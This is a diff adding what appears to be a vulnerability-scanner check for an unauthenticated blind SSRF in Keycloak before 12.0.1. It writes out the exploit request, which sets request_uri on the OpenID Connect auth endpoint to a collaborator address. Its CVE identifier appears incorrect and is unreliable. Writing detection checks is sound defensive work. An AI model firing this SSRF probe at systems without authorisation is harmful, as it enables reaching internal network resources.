@@ -1,0 +1,30 @@
+metadata:
+  language: v1-beta
+  name: "Keycloak before 12.0.1 version - request_uri Blind Server-Side Request Forgery (Unauthenticated)"
+  description: "Keycloak allows an unauthenticated attacker to send arbitrary values in 'request_uri' parameter and interact with internal network resources which is otherwise not accessible externally. An attacker may use this feature to perform Blind SSRF (Server-side request forgery) attacks on the server."
+  author: "mrrootsec"
+  tags: "keycloak", "cve", "ssrf"
+
+run for each:
+  potential_path = `/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{generate_collaborator_address()}`
+
+  given host then
+    send request:
+      method: `GET`
+      path: {potential_path}
+
+  if dns interactions then
+    report issue:
+      severity: info
+      confidence: certain
+      detail: "Vulnerable to CVE-2021-10774 - Keycloak - request_uri Blind Server-Side Request Forgery (SSRF)"
+      remediation: "Upgrade to the latest version of Keycloak"
+  end if
+
+  if http interactions then
+    report issue:
+      severity: high
+      confidence: certain
+      detail: "Vulnerable to CVE-2021-10774 - Keycloak - request_uri Blind Server-Side Request Forgery (SSRF)"
+      remediation: "Upgrade to the latest version of Keycloak"
+  end if
